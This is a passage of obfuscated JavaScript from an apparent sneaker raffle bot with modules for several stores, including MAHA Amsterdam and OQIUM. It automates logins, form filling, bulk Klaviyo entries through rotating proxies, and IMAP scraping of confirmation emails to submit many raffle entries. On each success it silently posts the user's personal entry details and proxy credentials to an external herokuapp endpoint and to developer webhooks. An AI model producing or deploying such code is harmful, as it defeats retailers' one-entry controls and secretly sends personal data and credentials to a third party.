                            console['log'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20Logging\x20in'), await _0x3113b3['waitForSelector']('#username'), await _0x3113b3['type']('#username', _0xc9ce23[_0x565783]['Email']), await _0x3113b3['waitForSelector']('#password'), await _0x3113b3['type']('#password', _0xc9ce23[_0x565783]['Password']), await _0x4aaa24(0x190), await _0x3113b3['click']('#buttonSubmit'), await _0x3113b3['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x4aaa24(0x1f4), console['log'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0xc9ce23[_0x565783]['Size']);
                            let _0x25c613 = _0xc9ce23[_0x565783]['Size']['replace']('.5', '\x201/2');
                            if (_0x25c613['toUpperCase']() == 'RANDOM') {
                                const _0x51697b = await _0x3113b3['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x2e5575 = Math['round'](Math['random']() * (_0x51697b['length'] - 0x1));
                                await _0x51697b[_0x2e5575]['click']();
                            } else
                                await _0x3113b3['click']('button[aria-label=\x22' + _0x25c613 + '\x22]');
                            await _0x4aaa24(0x1f4);
                            try {
                                await _0x3113b3['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x4aaa24(0x12c), console['log'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3113b3['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x4aaa24(0x12c), await _0x3113b3['type']('#dwfrm_raffle_addressFields_firstName', _0xc9ce23[_0x565783]['FirstName']), await _0x4aaa24(0x12c), await _0x3113b3['type']('#dwfrm_raffle_addressFields_lastName', _0xc9ce23[_0x565783]['LastName']), await _0x4aaa24(0x12c), await _0x3113b3['select']('#dwfrm_raffle_addressFields_country', _0xc9ce23[_0x565783]['Country']), await _0x4aaa24(0x12c), await _0x3113b3['type']('#dwfrm_raffle_addressFields_city', _0xc9ce23[_0x565783]['City']), await _0x4aaa24(0x12c);
                            _0xc9ce23[_0x565783]['Postcode'] == undefined && (_0xc9ce23[_0x565783]['Postcode'] = _0xc9ce23[_0x565783]['Zip']);
                            await _0x3113b3['type']('#dwfrm_raffle_addressFields_postalCode', _0xc9ce23[_0x565783]['Postcode']), await _0x4aaa24(0x12c), await _0x3113b3['type']('#dwfrm_raffle_addressFields_address1', _0xc9ce23[_0x565783]['Address1']), await _0x4aaa24(0x12c), await _0x3113b3['type']('#dwfrm_raffle_addressFields_address2', _0xc9ce23[_0x565783]['HouseNumber']), await _0x4aaa24(0x12c), await _0x3113b3['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0xc9ce23[_0x565783]['Address2']), await _0x4aaa24(0x12c), await _0x3113b3['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x4aaa24(0x12c), await _0x3113b3['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0xc9ce23[_0x565783]['Follower']), await _0x4aaa24(0x1f4), await _0x3113b3['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x4aaa24(0x1f4), console['log'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20' + _0x3f1ec6['blue']('Awaiting\x20Paypal\x20Payment')), await _0x3113b3['click']('.b-paypal_button');
                            try {
                                await _0x3113b3['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x14ac5b = 'no', _0x3265a5(_0xc9ce23[_0x565783], _0x1aec55), console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x4daf66['succesDEVMSG']);
                                await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x4daf66['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x510dd4, _0x4daf66['succesPUBMSG']);
                                let _0x11f22f = _0xc9ce23[_0x565783];
                                try {
                                    prxdata = {
                                        'username': _0x1b66d2['replace']('#', ''),
                                        'module': _0x1aec55['name'],
                                        'entrydata': JSON['stringify'](_0x11f22f),
                                        'proxy': '' + _0x594859[_0x565783]
                                    };
                                    var _0x503fba = JSON['stringify'](prxdata);
                                    let _0x385dba = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x503fba, _0x385dba);
                                } catch (_0x2069da) {
                                }
                            } catch (_0x3aaf79) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x3aaf79)), _0x23b961 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x3aaf79;
                                var _0x1d1315 = await _0xe75614(_0xc9ce23[_0x565783], _0x1aec55, 'dev', !![], _0x23b961);
                                _0x4daf66['errorDEV'] = { 'embeds': [_0x1d1315] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x4daf66['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x4daf66['errorDEV']);
                            }
                        } catch (_0x1faf45) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20' + _0x1faf45)), _0x23b961 = '' + _0x1faf45;
                            var _0x1d1315 = await _0xe75614(_0xc9ce23[_0x565783], _0x1aec55, 'dev', !![], _0x23b961);
                            _0x4daf66['errorDEV'] = { 'embeds': [_0x1d1315] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x4daf66['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x4daf66['errorDEV']), _0x14ac5b = 'yes';
                        } finally {
                            _0xf98e5a && _0xf98e5a['close']();
                            if (_0x14ac5b == 'yes' && _0x457d57 != 0x5) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20Retrying\x20(' + _0x457d57 + '\x20/\x205)')), _0x565783 = _0x565783 - 0x1, _0x457d57 = _0x457d57 + 0x1;
                                continue;
                            }
                            _0x14ac5b == 'yes' && _0x457d57 >= 0x5 && (_0x5d0cd0(_0xc9ce23[_0x565783], _0x1aec55), _0x14ac5b = 'no', _0x457d57 = 0x0), console['log']('Waiting\x20for\x20' + _0x343742['AfewDelay'] + '\x20ms'), await _0x4aaa24(_0x343742['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x33c393, _0x4d24a7, _0x5dc049) {
                    for (var _0x2ec708 = 0x0; _0x2ec708 < _0x4d24a7['length']; _0x2ec708++) {
                        try {
                            await _0x10409e(_0x4d24a7, _0x2ec708);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x1a8756(_0x39b35b, _0x59cb84, _0x56876b, _0x364d00, _0x20fcbb) {
                            var _0x2569db, _0x230bcb = {}, _0x500c4b = [], _0x4991e0 = {}, _0x5337be = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x18deb6 = Math['round'](Math['random']() * (_0x5337be['length'] - 0x1));
                            !_0x364d00 && (_0x364d00 = {});
                            if (_0x59cb84 != 'ver') {
                                _0x5c2a2f(_0x56876b['name'] + '\x20Task\x20' + (_0x39b35b + 0x1) + '\x20/\x20' + _0x364d00['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32), await _0x10409e(_0x364d00, _0x39b35b), _0x230bcb = _0x56876b['data'], _0x230bcb['data']['attributes']['email'] = '' + _0x364d00[_0x39b35b]['Email'];
                                if (_0x364d00[_0x39b35b]['Size'] == 'RANDOM') {
                                }
                                _0x230bcb['data']['attributes']['properties']['$first_name'] = '' + _0x364d00[_0x39b35b]['FirstName'], _0x230bcb['data']['attributes']['properties']['$last_name'] = '' + _0x364d00[_0x39b35b]['LastName'], _0x230bcb['data']['attributes']['properties']['$address1'] = _0x364d00[_0x39b35b]['Address1'] + '\x20' + _0x364d00[_0x39b35b]['Address2'] + '\x20' + _0x364d00[_0x39b35b]['HouseNumber'], _0x230bcb['data']['attributes']['properties']['$zip'] = '' + _0x364d00[_0x39b35b]['Zip'], _0x230bcb['data']['attributes']['properties']['$city'] = '' + _0x364d00[_0x39b35b]['City'], _0x230bcb['data']['attributes']['properties']['$country'] = '' + _0x364d00[_0x39b35b]['Country'], _0x364d00[_0x39b35b]['Size'] == 'RANDOM' ? _0x230bcb['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5337be[_0x18deb6] : _0x230bcb['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x364d00[_0x39b35b]['Size'], _0x230bcb['data']['attributes']['properties']['$phone_number'] = '' + _0x364d00[_0x39b35b]['Phone'], _0x230bcb['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x364d00[_0x39b35b]['Follower'];
                            }
                            if (_0x343742['useRandomProxy'] = ![])
                                var _0x2357eb = _0x20fcbb[_0x39b35b]['split'](':');
                            else
                                var _0x2b0324 = Math['round'](Math['random']() * (_0x20fcbb['length'] - 0x1)), _0x2357eb = _0x20fcbb[_0x2b0324]['split'](':');
                            var _0x4d4d9e = {
                                'jar': _0x30822e,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x56876b['url'],
                                'headers': _0x56876b['headers'],
                                'body': JSON['stringify'](_0x230bcb),
                                'proxy': 'http://' + _0x2357eb[0x2] + ':' + _0x2357eb[0x3] + '@' + _0x2357eb[0x0] + ':' + _0x2357eb[0x1]
                            };
                            return _0x59cb84 != 'ver' && (_0x4d4d9e['url'] = _0x56876b['url'], _0x4d4d9e['headers'] = _0x56876b['headers']), _0x59cb84 == 'ver' && (_0x4d4d9e['method'] = 'GET'), new Promise(function (_0xc24754, _0x3f17c1) {
                                callback = async (_0x754a15, _0x2f7c6e, _0x551e12) => {
                                    if (!_0x754a15 && _0x2f7c6e['statusCode'] == 0xca || !_0x754a15 && _0x2f7c6e['statusCode'] == 0xc8) {
                                        if (_0x59cb84 != 'ver') {
                                            var _0xbb2ba9 = await _0xe75614(_0x364d00[_0x39b35b], _0x56876b, 'dev', ![]), _0x5451c9 = await _0xe75614(_0x364d00[_0x39b35b], _0x56876b, 'pub', ![]);
                                            const _0x59de49 = {
                                                'succesDEVMSG': { 'embeds': [_0xbb2ba9] },
                                                'succesPUBMSG': { 'embeds': [_0x5451c9] }
                                            };
                                            let _0x2b36db = _0x364d00[_0x39b35b];
                                            try {
                                                prxdata = {
                                                    'username': _0x1b66d2['replace']('#', ''),
                                                    'module': _0x56876b['name'],
                                                    'entrydata': JSON['stringify'](_0x2b36db),
                                                    'proxy': '' + _0x20fcbb[_0x39b35b]
                                                };
                                                var _0x1a6e89 = JSON['stringify'](prxdata);
                                                let _0x13312c = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x1a6e89, _0x13312c);
                                            } catch (_0x1a2a47) {
                                            }
                                            if (_0x343742['webhook'] != undefined && _0x343742['webhook'] != '')
                                                try {
                                                    await _0x3c4b04(_0x343742['webhook'], _0x59de49['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x59de49['succesDEVMSG']), await _0x4aaa24(0xc8);
                                            try {
                                                await _0x3c4b04(_0x510dd4, _0x59de49['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x3265a5(_0x364d00[_0x39b35b], _0x56876b);
                                        }
                                        _0xc24754(console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x56876b['name'] + ']\x20Task\x20' + (_0x39b35b + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x59cb84 != 'ver') {
                                            var _0x43f281 = '' + _0x754a15, _0x3e01ad = await _0xe75614(_0x364d00[_0x39b35b], _0x56876b, 'dev', !![], _0x43f281), _0x13183a = {};
                                            _0x13183a['errorDEV'] = { 'embeds': [_0x3e01ad] }, _0x5d0cd0(_0x364d00[_0x39b35b], _0x56876b), _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x13183a['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x13183a['errorDEV']);
                                        }
                                        _0x3f17c1(console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x56876b['name'] + ']\x20Task\x20' + (_0x39b35b + 0x1) + ':\x20' + _0x754a15)));
                                    }
                                };
                                try {
                                    _0x59cb84 != 'ver' && console['log'](_0x15e32e() + '\x20[' + _0x56876b['name'] + ']\x20Task\x20' + (_0x39b35b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x230bcb['data']['attributes']['email']), _0x954c28(_0x4d4d9e, callback);
                                } catch (_0x1706d4) {
                                    console['log'](_0x15e32e() + '\x20Task\x20' + (_0x39b35b + 0x1) + ':\x20' + _0x1706d4);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x1a8756(_0x2ec708, 'nor', _0x33c393, _0x4d24a7, _0x5dc049), console['log'](_0x15e32e() + '\x20[' + _0x33c393['name'] + ']\x20Sleeping\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                        } catch (_0x51416c) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4ca408, _0x1fb93a, _0x988452) {
                    var _0x4c2b37 = [], _0x498064 = ![];
                    async function _0x3895f4() {
                        var _0x599371 = new _0x5a0913({
                            'user': _0x343742['masterMail'],
                            'password': _0x343742['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1b6dfd(_0x82557d) {
                            _0x599371['openBox']('INBOX', ![], _0x82557d);
                        }
                        _0x599371['once']('ready', function () {
                            _0x1b6dfd(function (_0x1d6e31, _0xc1365e) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1d6e31)
                                    throw _0x1d6e31;
                                _0x599371['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x8558be, _0xebf061) {
                                    if (!_0xebf061 || !_0xebf061['length'])
                                        console['log'](_0x15e32e() + '\x20[' + _0x4ca408['name'] + ']\x20No\x20mails\x20found'), _0x599371['end']();
                                    else {
                                        var _0x1ac535 = _0x599371['seq']['fetch'](_0xebf061, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x1ac535['on']('message', function (_0x283fa3, _0x3ca47d) {
                                            var _0xe24ec0 = '(#' + _0x3ca47d + ')\x20';
                                            _0x283fa3['on']('body', function (_0x49d58a, _0x2a31a9) {
                                                _0x57117f(_0x49d58a, (_0x13932b, _0x1b8c72) => {
                                                    var _0x523e1f = _0x1b8c72['text']['split']('(')[0x1], _0x3f8037 = _0x523e1f['split'](')')[0x0];
                                                    _0x4c2b37['push'](_0x3f8037);
                                                });
                                            }), _0x283fa3['once']('end', function () {
                                            });
                                        }), _0x1ac535['once']('error', function (_0x278538) {
                                            console['log']('Fetch\x20error:\x20' + _0x278538), _0x498064 = !![];
                                        }), _0x1ac535['once']('end', function () {
                                            _0x599371['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x599371['once']('error', function (_0x24b8cd) {
                            console['log'](_0x3f1ec6['red'](_0x24b8cd['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x498064 = !![];
                        }), _0x599371['once']('end', async function () {
                            _0x498064 = !![];
                        }), _0x599371['connect']();
                    }
                    async function _0x231d63(_0x502b25, _0x433229, _0x3728c2) {
                        for (var _0x4b391d = 0x0; _0x4b391d < _0x433229['length']; _0x4b391d++) {
                            async function _0x54f2dc(_0x3ebde0, _0x3dd82a, _0x34a81e, _0x21925d, _0x3eb38d) {
                                var _0x25bb3a, _0x1eda6a = {}, _0x15ced6 = [], _0x449e34 = {}, _0x357893 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x59f096 = Math['round'](Math['random']() * (_0x357893['length'] - 0x1));
                                _0x21925d[_0x3ebde0]['Size'] == 'RANDOM' && (_0x21925d[_0x3ebde0]['Size'] = _0x357893[_0x59f096]);
                                !_0x21925d && (_0x21925d = {});
                                if (_0x343742['useRandomProxy'] = ![])
                                    var _0x561c6f = _0x3eb38d[_0x3ebde0]['split'](':');
                                else
                                    var _0x3f73a1 = Math['round'](Math['random']() * (_0x3eb38d['length'] - 0x1)), _0x561c6f = _0x3eb38d[_0x3f73a1]['split'](':');
                                var _0x1b4f91 = {
                                    'jar': _0x30822e,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x34a81e['url'],
                                    'headers': _0x34a81e['headers'],
                                    'body': JSON['stringify'](_0x1eda6a),
                                    'proxy': 'http://' + _0x561c6f[0x2] + ':' + _0x561c6f[0x3] + '@' + _0x561c6f[0x0] + ':' + _0x561c6f[0x1]
                                };
                                return _0x3dd82a != 'ver' && (_0x1b4f91['url'] = _0x34a81e['url'], _0x1b4f91['headers'] = _0x34a81e['headers']), _0x3dd82a == 'ver' && (_0x1b4f91['method'] = 'GET', _0x1b4f91['url'] = _0x21925d[_0x3ebde0]), new Promise(function (_0x59b4ca, _0x5f30f7) {
                                    callback = async (_0x569c95, _0x552863, _0x34837c) => {
                                        if (!_0x569c95 && _0x552863['statusCode'] == 0xca || !_0x569c95 && _0x552863['statusCode'] == 0xc8) {
                                            if (_0x3dd82a != 'ver') {
                                                var _0xa693e7 = await _0xe75614(_0x21925d[_0x3ebde0], _0x34a81e, 'dev', ![]), _0x3ac542 = await _0xe75614(_0x21925d[_0x3ebde0], _0x34a81e, 'pub', ![]);
                                                const _0x386ae3 = {
                                                    'succesDEVMSG': { 'embeds': [_0xa693e7] },
                                                    'succesPUBMSG': { 'embeds': [_0x3ac542] }
                                                };
                                                if (_0x343742['webhook'] != undefined && _0x343742['webhook'] != '')
                                                    try {
                                                        await _0x3c4b04(_0x343742['webhook'], _0x386ae3['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x386ae3['succesDEVMSG']), await _0x4aaa24(0xc8);
                                                try {
                                                    await _0x3c4b04(_0x510dd4, _0x386ae3['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3265a5(_0x21925d[_0x3ebde0], _0x34a81e);
                                            }
                                            _0x59b4ca(console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x34a81e['name'] + ']\x20Task\x20' + (_0x3ebde0 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3dd82a != 'ver') {
                                                var _0x588e5c = '' + _0x569c95, _0x22af11 = await _0xe75614(_0x21925d[_0x3ebde0], _0x34a81e, 'dev', !![], _0x588e5c), _0x2fda67 = {};
                                                _0x2fda67['errorDEV'] = { 'embeds': [_0x22af11] }, _0x5d0cd0(_0x21925d[_0x3ebde0], _0x34a81e), _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x2fda67['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x2fda67['errorDEV']);
                                            }
                                            _0x5f30f7(console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x34a81e['name'] + ']\x20Task\x20' + (_0x3ebde0 + 0x1) + ':\x20' + _0x569c95)));
                                        }
                                    };
                                    try {
                                        _0x3dd82a != 'ver' ? console['log'](_0x15e32e() + '\x20[' + _0x34a81e['name'] + ']\x20Task\x20' + (_0x3ebde0 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1eda6a['data']['attributes']['email']) : console['log'](_0x15e32e() + '\x20[' + _0x34a81e['name'] + ']\x20Task\x20' + (_0x3ebde0 + 0x1) + ':\x20Fetching\x20Response'), _0x954c28(_0x1b4f91, callback);
                                    } catch (_0x4084a2) {
                                        console['log'](_0x15e32e() + '\x20Task\x20' + (_0x3ebde0 + 0x1) + ':\x20' + _0x4084a2);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x54f2dc(_0x4b391d, 'ver', _0x502b25, _0x433229, _0x3728c2), console['log'](_0x15e32e() + '\x20[' + _0x502b25['name'] + ']\x20Sleeping\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                            } catch (_0x4a15b9) {
                            }
                        }
                    }
                    try {
                        _0x3895f4();
                        while (!_0x498064) {
                            await _0x4aaa24(0xbb8);
                        }
                        console['log']('Found\x20' + _0x4c2b37['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4aaa24(0x9c4);
                    }
                    await _0x231d63(_0x4ca408, _0x4c2b37, _0x988452);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RVHsXu',
                            'custom_source': 'DH6927-017',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'ScxJcu',
                                '$consent_form_version': 0x8c005b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xef34f6, _0x289006, _0xb68e67) {
                    var _0x2277ea = _0x289006, _0xdf700a = 0x0;
                    for (var _0x10bd79 = 0x0; _0x10bd79 < _0x289006['length']; _0x10bd79++) {
                        maxTasks = _0x343742['threads'];
                        while (_0xdf700a >= maxTasks) {
                            await _0x4aaa24(_0x343742['delay']);
                        }
                        async function _0x4823eb(_0x4cc108, _0xe0e56d, _0x539d9a, _0x3fa5d1) {
                            try {
                                await _0x10409e(_0xe0e56d, _0x3fa5d1);
                            } catch (_0x301729) {
                                throw new Error(_0x301729);
                            }
                            async function _0x5abd41(_0x432e22, _0x2ceb4d, _0xaf1e66, _0x2f8d38, _0x4327f6) {
                                _0xdf700a++;
                                var _0x793edd, _0x31c709 = {}, _0x253471 = [], _0x1af1d2 = {}, _0x536c24 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x1fa55e = Math['round'](Math['random']() * (_0x536c24['length'] - 0x1));
                                !_0x2f8d38 && (_0x2f8d38 = {});
                                if (_0x2ceb4d != 'ver') {
                                    _0x5c2a2f(_0xaf1e66['name'] + '\x20Task\x20' + (_0x432e22 + 0x1) + '\x20/\x20' + _0x2f8d38['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32), _0x253471 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x1b66d2
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x2f8d38[_0x432e22]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x343742['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x3c97e2
                                            }
                                        ]
